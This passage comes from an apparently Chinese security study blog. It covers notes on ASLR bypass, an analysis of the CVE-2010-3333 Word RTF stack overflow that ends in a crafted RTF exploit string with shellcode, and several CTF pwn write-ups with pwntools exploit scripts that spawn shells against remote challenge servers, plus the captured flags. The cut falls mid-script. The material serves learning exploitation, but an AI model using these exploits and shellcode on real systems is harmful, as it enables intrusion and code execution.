<h3 id="映像随机化"><a href="#映像随机化" class="headerlink" title="映像随机化"></a>映像随机化</h3><p>在PE文件映射到内存中，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启红藕这个地址会变化。</p>
<p>映像随机化只对加载基址的前2个字节做了随机处理。</p>
<h3 id="堆栈随机化"><a href="#堆栈随机化" class="headerlink" title="堆栈随机化"></a>堆栈随机化</h3><p>在程序运行时随机的选择堆栈基址，堆栈基址在打开程序的时候确定。</p>
<h3 id="PEB和TEB随机化"><a href="#PEB和TEB随机化" class="headerlink" title="PEB和TEB随机化"></a>PEB和TEB随机化</h3><p>TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30的位置。</p>
<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="攻击未启用ASLR模块"><a href="#攻击未启用ASLR模块" class="headerlink" title="攻击未启用ASLR模块"></a>攻击未启用ASLR模块</h3><p>ASLR仅仅是安全机制，不支持ASLR的软件很多，这意味着加载基址固定，在当前进程找到这样的模块就可以利用它里面的指令作为跳板直接无视ASLR.</p>
<p>如：Adobe Flash Player ActiveX</p>
<h3 id="利用部分覆盖进行定位内存地址"><a href="#利用部分覆盖进行定位内存地址" class="headerlink" title="利用部分覆盖进行定位内存地址"></a>利用部分覆盖进行定位内存地址</h3><p>之前说过，映像随机化只是对映像加载基址的前2个字节做随机化处理，我们可覆盖这个地址的最后几个固定字节，就可以在一定范围内控制程序。<br>采用这种类似相对寻址方法来动态确定跳板指令的地址以实现调班指令的通用性。</p>
<h3 id="利用Heap-spray技术定位内存地址"><a href="#利用Heap-spray技术定位内存地址" class="headerlink" title="利用Heap spray技术定位内存地址"></a>利用Heap spray技术定位内存地址</h3><p>Heap spray原理：通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。</p>
<h3 id="利用Java-applet-heap-spray技术定位内存地址"><a href="#利用Java-applet-heap-spray技术定位内存地址" class="headerlink" title="利用Java applet heap spray技术定位内存地址"></a>利用Java applet heap spray技术定位内存地址</h3><h3 id="为-NET控件禁用ASLR"><a href="#为-NET控件禁用ASLR" class="headerlink" title="为.NET控件禁用ASLR"></a>为.NET控件禁用ASLR</h3>
      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-漏洞战争学习笔记2：CVE-2010-3333" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/16/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/" class="article-date">
      <time datetime="2020-10-16T04:29:57.552Z" itemprop="datePublished">2020-10-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/16/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/">漏洞战争学习笔记2：CVE-2010-3333</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p>
<p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p>
<h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p>
<p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p>
<h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p>
<p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p>
<p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p>
<p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p>
<p>[待续]</p>
<p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p>
<ul>
<li>g</li>
<li>kb</li>
</ul>
<p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p>
<p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p>
<ul>
<li>p</li>
</ul>
<p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p>
<h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\rtf1&#123;&#125;&#123;\shp&#123;\*\shpinst&#123;\sp&#123;\sn pfragments&#125;&#123;\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" rel="tag">漏洞战争</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-攻防世界pwn-string" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" class="article-date">
      <time datetime="2020-10-16T04:29:57.520Z" itemprop="datePublished">2020-10-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/">攻防世界 string</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>checksec 查看保护机制</p>
<p><img src="https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png" alt="捕获.PNG"></p>
<p>注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000.</p>
<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>IDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。</p>
<p><img src="https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png" alt="17627983-1901e053361f6609.png"></p>
<blockquote>
<p>注：<code>((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code> 就是将v1强制转换为一个函数指针</p>
</blockquote>
<p>其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5.</p>
<p><img src="https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png" alt="17627983-161d0aad17e6e884.png"></p>
<p>可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85</p>
<p>按流程分析：<br>在sub_400A7D()中，满足s1==“east”，则跳出函数。</p>
<p>在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写）</p>
<p><img src="https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png" alt="17627983-6cdde7e8a076f299.png"></p>
<p><code>printf(&amp;format, &amp;format);</code></p>
<p>通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。</p>
<blockquote>
<p>函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。</p>
</blockquote>
<blockquote>
<p>利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell.</p>
</blockquote>
<blockquote>
<p>Pwntools  shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用）</p>
</blockquote>
<p><code>printf(shellcraft.sh())  #打印出shellcode</code><br><code>printf(asm(shellcraft.sh()))  #打印出汇编后的shellcode</code></p>
<p>用gdb调试程序，在printf下断点，输入%x测试，发现输出如图：</p>
<p><img src="https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png" alt="17627983-fe71239050c56166.png"></p>
<p>填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数）</p>
<blockquote>
<p>conext.log_level=”debug”  脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错</p>
</blockquote>
<p>补：<br>之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。</p>
<p><img src="https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png" alt="17627983-56395b2513720994.png"></p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"> #sh&#x3D;process(&#39;.&#x2F;string&#39;)</span><br><span class="line">sh&#x3D;remote(&#39;111.198.29.45&#39;,36129)</span><br><span class="line">context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh.recvuntil(&#39;secret[0] is&#39;)</span><br><span class="line">v3_addr&#x3D;int(sh.recv(7),16)</span><br><span class="line">sh.recvuntil(&#39;name be:&#39;)</span><br><span class="line">sh.sendline(&#39;zzz&#39;)</span><br><span class="line">sh.recvuntil(&#39;east or up?:&#39;)</span><br><span class="line">sh.sendline(&#39;east&#39;)</span><br><span class="line">sh.recvuntil(&#39;leave(0)?:&#39;)</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;\&#39;Give me an address\&#39;&#39;)</span><br><span class="line">sh.sendline(str(v3_addr))</span><br><span class="line">sh.recvuntil(&#39;you wish is:&#39;)</span><br><span class="line">payload&#x3D;&#39;%085c&#39;+&#39;%7$n&#39;</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(&#39;I will help you! USE YOU SPELL&#39;)</span><br><span class="line">sh.sendline(asm(shellcraft.amd64.linux.sh(),arch&#x3D;&quot;amd64&quot;))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>


<p>cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-攻防世界pwn-int_overflow" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/" class="article-date">
      <time datetime="2020-10-16T04:29:57.489Z" itemprop="datePublished">2020-10-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/">攻防世界 int_overflow</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="checksec-查看保护机制"><a href="#checksec-查看保护机制" class="headerlink" title="checksec 查看保护机制"></a>checksec 查看保护机制</h3><p><img src="https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png" alt="捕获.PNG"></p>
<p>可直接使用栈溢出；基地址不变化；栈中数据有执行权限；</p>
<h3 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h3><p>32位文件，按流程查看程序，main()无突破点。</p>
<p>进入login(),限制username长度最大0x19;限制passwd长度最大0x199；</p>
<p>进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。</p>
<blockquote>
<p>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。</p>
</blockquote>
<p>综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit）</p>
<p>溢出之后到达else语句，函数返回  strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。</p>
<p><img src="https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png" alt="17627983-0f96bbadb310adc5.png"></p>
<p>在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B.</p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。</p>
<p>在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言：</p>
<p><img src="https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png" alt="17627983-255df211907024ca.png"></p>
<p><img src="https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png" alt="17627983-73596713043662d6.png"></p>
<p>在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：<strong>在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。</strong>随机选取数值262.<br>（what_is_this()函数的地址为4字节）</p>
<p>262-0x14-4-4=234</p>
<p>或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。</p>
<p><img src="https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png" alt="捕获.PNG"></p>
<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh&#x3D;remote(&#39;111.198.29.45&#39;,39118)</span><br><span class="line">sh.recvuntil(&#39;Your choice:&#39;)</span><br><span class="line">flag&#x3D;0x0804868B</span><br><span class="line">sh.sendline(&#39;1&#39;)</span><br><span class="line">sh.recvuntil(&#39;username:&#39;)</span><br><span class="line">sh.sendline(&#39;z&#39;)</span><br><span class="line">sh.recvuntil(&#39;passwd:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*0x14+&#39;aaaa&#39;+p32(flag)+&#39;a&#39;*234</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>cyberpeace{2a2d92a084e034be9c3a03bbab4f149b}</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-攻防世界pwn-guess_num" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/" class="article-date">
      <time datetime="2020-10-16T04:29:57.473Z" itemprop="datePublished">2020-10-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-guess_num/">攻防世界 guess_num</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>查看关键main()函数，发现gets(&amp;v11)存在栈溢出</p>
<p><img src="https://i.loli.net/2020/05/08/9dWjqTSBtmRkHgG.png" alt="17627983-c6ff7c8db83a9ec7.png"></p>
<p>进入sub_C3E()函数，确定满足条件即可cat flag。</p>
<p><img src="https://i.loli.net/2020/05/08/QgLDtJBZlhXYyFa.png" alt="17627983-1e961fbba4dff1bc.png"></p>
<p>题目要求，先输入name,然后连续十次猜对数字得到flag, 进入V11,在栈中占0x20，可以覆盖到seed，使seed[0]已知，后使输入的v8等于随机数v10,拿到flag。</p>
<blockquote>
<p>注：<br>（1）在调用rang()时，先利用srand()设好随机数种子，若未设置，rand()在调用的时候会自动设为1.<br>（2）libc共享库：可以使用命令 ldd guess_num 查找<br>（3）如何在脚本中调用动态库中的程序：python库ctypes模块，使用cdll.LoadLibrary(‘’)<br>(4)什么情况程序在编译前加载了动态库：比如我们在使用print家族、puts等未在程序里声明的函数，需要通过引用动态库里面就有程序不用声明就能进行调用的函数。</p>
</blockquote>
<p>exp:</p>
<p><img src="https://i.loli.net/2020/05/08/hltLr1UKMu6qmcG.png" alt="17627983-82da413e439821bd.png"></p>
<blockquote>
<p>解释：<br>引入pwn、ctypes模块；<br>remote连接其他主机服务；<br>elf=ELF(bin路径)本地运行pwn文件；<br>libc调用动态库;构造payload,随机数a覆盖到seed[0],设定随机数种子为1；<br>recvuntil()接收字符串；<br>sendline(payload)发送payload；<br>srand(1)设定随机数种子为1；<br>循环十次；<br>interactive()直接进行交互；</p>
</blockquote>
<p><img src="https://i.loli.net/2020/05/08/UXbv96WNxFriu3k.png" alt="17627983-caa9a4e5b8ce9f1a.png"></p>
<p>另一种方式：利用C程序，直接覆盖seed,爆出随机数，得到flag.</p>
<p><img src="https://i.loli.net/2020/05/08/LoDke3q2xhGSPHU.png" alt="17627983-93fb0ad7c552854b.png"></p>
<p><img src="https://s1.ax1x.com/2020/05/08/YnNVrd.png" alt="YnNVrd.png"></p>
<p><img src="https://s1.ax1x.com/2020/05/08/YnNMPf.png" alt="YnNMPf.png"></p>
<p>cyberpeace{c89cf2a54c56f16458a1164851a361b4}</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-攻防世界pwn-cgpwn2" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/" class="article-date">
      <time datetime="2020-10-16T04:29:57.466Z" itemprop="datePublished">2020-10-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-cgpwn2/">攻防世界 cgpwn2</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>算是简单题，进入hello()函数中发现gets(&amp;s) 栈溢出漏洞。</p>
<p>name是全局变量，在bss区段，适合写入。</p>
<p>pwn()函数中调用了__system，但并没有‘/bin/sh’</p>
<p><img src="https://i.loli.net/2020/05/08/veR8Fb2xkDMifVz.png" alt="17627983-d0f4027f425eadcd.png"></p>
<p><img src="https://i.loli.net/2020/05/08/QPL4xp8Wws1DJUc.png" alt="17627983-8f37fec1f7e9fab3.png"></p>
<p><img src="https://i.loli.net/2020/05/08/abOyYLf9FERVqvZ.png" alt="17627983-a19abf21a8c9c0f7.png"></p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>在name中写入’/bin/sh’。利用栈溢出覆盖返回地址，使函数返回到system上，拿到shell。</p>
<p>payload=填充栈+覆盖保存的exp的值4字节+假的返回地址call __system(‘/bin/sh’)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> # p &#x3D; process(&#39;.&#x2F;cgpwn2&#39;)</span><br><span class="line">p &#x3D; remote(&quot;111.198.29.45&quot;,32966)</span><br><span class="line">system_addr &#x3D; 0x804855A</span><br><span class="line">bss_addr &#x3D; 0x804A080</span><br><span class="line">p.recvuntil(&#39;name\n&#39;)</span><br><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br><span class="line">p.recvuntil(&#39;here:\n&#39;)</span><br><span class="line">payload &#x3D; 0x26*&#39;a&#39; +&#39;bbbb&#39;+ p32(system_addr) + p32(bss_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>cyberpeace{f92dbe7e38fed8edda8b7513b09acdc7}</p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-攻防世界pwn-100" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/" class="article-date">
      <time datetime="2020-10-16T04:29:57.451Z" itemprop="datePublished">2020-10-16</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/10/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-100/">攻防世界pwn-100</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>查壳：checksec</p>
<p><img src="https://i.loli.net/2020/05/31/mfOTnUiRdaMHtGE.png" alt="查壳.PNG"></p>
<p>64位，无stack,无PIE；</p>
<p><img src="https://i.loli.net/2020/05/31/sHDG4fSe6xELluo.png" alt="1.PNG"></p>
<p>运行程序，输入字符，无反馈，无限制。</p>
<p><img src="https://i.loli.net/2020/05/31/axJ5bmchdIwRsfM.png" alt="漏洞.PNG"></p>
<p><img src="https://i.loli.net/2020/05/31/VCymAtHUqB7Pbei.png" alt="漏洞2.PNG"></p>
<p>ida查看main函数，发现存在栈溢出，参数a1大小为0x40.然而函数中获取大于等于a2（a2=200）的数值存入了a1.</p>
<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>无system函数，无/bin/sh字符串，有read,puts。参数经过寄存器传递（也可IDA查看），可以泄露libc,写入/bin/sh。</p>
<p><img src="https://i.loli.net/2020/05/31/wnf1YmoagvHcM2k.png" alt="寄存器传参.PNG"></p>
<p><img src="https://i.loli.net/2020/05/31/CrYc9oJgkWzthG2.png" alt="IDA查看寄存器.PNG"></p>
<p>puts只需要一个参数。寄存器rdi存放写入地址，rsi存放写入字节数。找到pop rdi;ret传参，即</p>
<p><code>pop rdi; ret</code><br><code>pop rsi; pop r15; ret</code></p>
<p><img src="https://i.loli.net/2020/05/31/c1NEeWTBvPy4OXj.png" alt="通过pop控制写入.PNG"></p>
<blockquote>
<p>注：调用read函数时，x86中参数直接放入栈中；x64设立了几个寄存器存放参数，调用函数时先向寄存器中放参数，当参数数量大于寄存器，才会像栈中放参数<br>传参顺序默认从后先开始传入。x86 x64一样。</p>
</blockquote>
<p>此处需要学习利用寄存器传递参数。</p>
<blockquote>
<p>关于pwntools的DynELF，主要功能是通过不断传入默认的函数地址到自己写的leak函数内部，测试并获取libc版本，得到函数地址。又因为DynELF无法搜索字符串地址，所以我们需要传入所需字符串，在调用函数加载bash。</p>
</blockquote>
<p>由于需要不断传参测试，加载程序后libc地址都会变化，可以重置程序解决问题。</p>
<p>初始化之后相当于一个新的程序，栈空间从新分配。此程序初始化段：</p>
<p><img src="https://i.loli.net/2020/05/31/EDtReszWUadf94H.png" alt="初始化.PNG"></p>
<blockquote>
<p>程序还需调用一个gadget,后续另起一篇学习</p>
</blockquote>
<p><img src="https://i.loli.net/2020/05/31/Kkm4sFIlzySxPZt.png" alt="gadget.PNG"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 